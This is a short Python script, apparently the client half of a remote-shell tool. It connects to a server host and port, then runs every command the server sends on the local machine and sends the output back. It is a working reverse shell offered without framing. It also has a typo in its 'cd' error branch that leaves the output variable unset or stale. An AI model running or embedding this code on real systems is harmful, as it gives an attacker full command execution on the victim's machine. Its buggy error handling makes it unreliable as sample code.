'''''''''

Client-side code

'''''''''

import socket
import os
import subprocess
import sys

# if testing both codes on same machine, set to 127.0.0.1
SERVER_HOST = sys.argv[1]  # if on local network, know the IP using config
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128  # 128KB max size of messages

# seperator string for sending 2 in 1 go
SEPARATOR = "<sep>"

# create the socket object
s = socket.socket()
# connect the server
s.connect((SERVER_HOST, SERVER_PORT))

# get the current directory
cwd = os.getcwd()
s.send(cwd.encode())


while True:
    # receive command from server
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()

    if command.lower() == "exit":
        # if command is exitm just break out of loop
        break
    if splited_command[0].lower() == "cd":
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            ouput = str(e)
        else:
            output = ""
    else:
        # execute command & return results
        output = subprocess.getoutput(command)
    # get current working directory
    cwd = os.getcwd()
    # send tresults back to server
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode())

# close client connection
s.close()
